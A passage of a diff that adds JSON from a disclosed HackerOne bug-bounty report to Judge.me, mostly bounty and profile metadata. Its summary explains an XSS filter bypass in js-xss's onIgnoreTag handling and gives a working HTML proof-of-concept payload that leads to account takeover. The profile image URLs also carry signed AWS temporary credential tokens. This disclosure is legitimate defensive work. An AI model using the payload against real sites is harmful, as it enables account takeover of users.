%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 16844390,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "We are awarding $750 to increase the total bounty to $1250 for a High severity report. Thanks for your report, you deserve this!",
+      "automated_response": false,
+      "created_at": "2022-05-25T07:55:37.006Z",
+      "updated_at": "2022-05-25T07:55:37.006Z",
+      "actor": {
+        "url": "/judgeme",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g9q03amoi8tu4efai3eu2n8z2i3y/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Judge.me "
+        }
+      },
+      "bounty_amount": "750.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "judgeme",
+      "collaborator": {
+        "username": "caue",
+        "url": "/caue"
+      }
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "id": 155698,
+      "category": "team",
+      "content": "XSS in `js-xss` with `onIgnoreTag` option. \n\n`js-xss` is used to prevent XSS on email templates previews but the custom `onIgnoreTag` function can be used to bypass this filter. This leads to a Self-XSS scenario that can be used to achieve Account Takeover in 1-click.\n\nThe way how js-xss parse tags starting with <![ differ from how browser parse it, so it's possible to abuse this in this way:\n```html\n<![endif]-- onerror=\"<![endif]-->\" onload=\"<img src=1 onerror='alert(1)' />\">\n```",
+      "user": {
+        "id": 473614,
+        "username": "linhdam",
+        "name": "Linh Dam",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://the.great.dev/",
+        "location": "",
+        "created_at": "2019-01-21T03:00:57.894Z",
+        "url": "https://hackerone.com/linhdam",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a74de9225619ae85b1c930b3d1f5e7d4a54a7737e3a07a5223552fb8e5b84f1e",
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65",
+          "xtralarge": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c64df8a7f55e313be4ae0ccd5c375b55803a9abde8554282b2b5708b33835375"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
